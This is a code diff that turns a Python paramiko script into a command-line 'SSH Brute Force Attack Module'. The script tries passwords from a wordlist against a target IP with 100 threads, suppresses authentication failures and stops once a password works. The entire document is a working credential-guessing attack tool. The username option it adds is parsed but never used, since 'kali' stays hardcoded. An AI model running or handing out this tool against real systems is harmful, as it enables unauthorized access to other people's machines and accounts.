@@ -1,31 +1,51 @@
 import paramiko
+import argparse
 from concurrent.futures import ThreadPoolExecutor
+from threading import Event
+
+stop_event = Event()
 
 def attempt(ip, pwd):
-    policy = paramiko.client.AutoAddPolicy
-    with paramiko.SSHClient() as client:
-        client.set_missing_host_key_policy(policy)
-        try:
-            client.connect(ip, username='kali', password=pwd)
-        except paramiko.ssh_exception.NoValidConnectionsError:
-            print("Connection failed")
-        else:
-            print(f"Password found: {pwd}")
-            exit(0)
+    if stop_event.is_set():
+        return
 
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
-ip = '192.168.1.223'
-# passwords = ['toor', 'admin']
-passwords = open('ssh_passwords.txt', 'r')
+    try:
+        client.connect(ip, username='kali', password=pwd.strip(), timeout=3, allow_agent=False, look_for_keys=False)
 
+    except paramiko.ssh_exception.AuthenticationException:
+        pass
 
-with ThreadPoolExecutor(max_workers=100) as ex:
-    for pwd in passwords:
-        print(f"Trying password: {pwd.strip()}")
-        ex.submit(attempt, ip, pwd)
+    except paramiko.ssh_exception.NoValidConnectionsError:
+        print("Connection failed")
+
+    except Exception:
+        pass
+
+    else:
+        print(f"Password found: {pwd.strip()}")
+        stop_event.set()
+
+    finally:
+        client.close()
 
 def main():
-    attempt(ip, passwords)
+    parser = argparse.ArgumentParser(description="SSH Brute Force Attack Module")
+    parser.add_argument("ip", help="Target IP address")
+    parser.add_argument("-u", "--username", default="kali")
+    parser.add_argument("-p", "--passwords", default="ssh_passwords.txt")
+
+    args = parser.parse_args()
+
+    with open(rf'{args.passwords}', 'r') as passwords:
+        with ThreadPoolExecutor(max_workers=100) as ex:
+            for pwd in passwords:
+                if stop_event.is_set():
+                    break
+
+                ex.submit(attempt, args.ip, pwd)
 
 if __name__ == "__main__":
     main()
